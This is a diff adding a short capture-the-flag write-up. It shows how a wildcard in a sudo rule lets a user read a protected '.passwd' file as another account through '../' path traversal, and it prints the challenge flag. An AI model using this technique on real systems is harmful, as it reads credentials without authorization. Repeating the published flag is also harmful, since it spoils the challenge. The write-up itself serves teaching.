@@ -1,0 +1,45 @@
+---
+tags: [linux]
+---
+# sudo - weak configuration
+
+- **Description:** Privilege escalation
+- **Difficulty:** Very easy
+
+---
+
+## 🔎 Solution
+After establishing an SSH connection with the user `app-script-ch1`, we check the sudo privileges for this user:
+```
+app-script-ch1@challenge02:~$ sudo -l
+...
+User app-script-ch1 may run the following commands on challenge02:
+    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
+```
+
+Here we see that this user cannot run commands as root via `sudo`, but can switch to the user `app-script-ch1-cracked` and execute exactly one command: `/bin/cat /challenge/app-script/ch1/notes/*`.
+
+This means the user is permitted to run a command like this:
+```
+app-script-ch1@challenge02:~$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/shared_notes 
+#####################
+        Todo
+
+- Change DHCP pool
+- Change IP routing
+- Beef up the fw
+```
+
+However, our objective is to read the contents of the file `/challenge/app-script/ch1/ch1cracked/.passwd`.
+
+Looking at the `sudo -l` output, we see the user is allowed to view `/challenge/app-script/ch1/notes/*` where `*` means all files in that directory. 
+So, if we replace `*` with `../ch1cracked/.passwd`, could we potentially read the target file?
+
+Testing this idea successfully reveals the flag:
+```
+app-script-ch1@challenge02:~$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
+b3_c4r3ful_w1th_sud0
+```
+
+## 🚩Flag
+> `b3_c4r3ful_w1th_sud0`
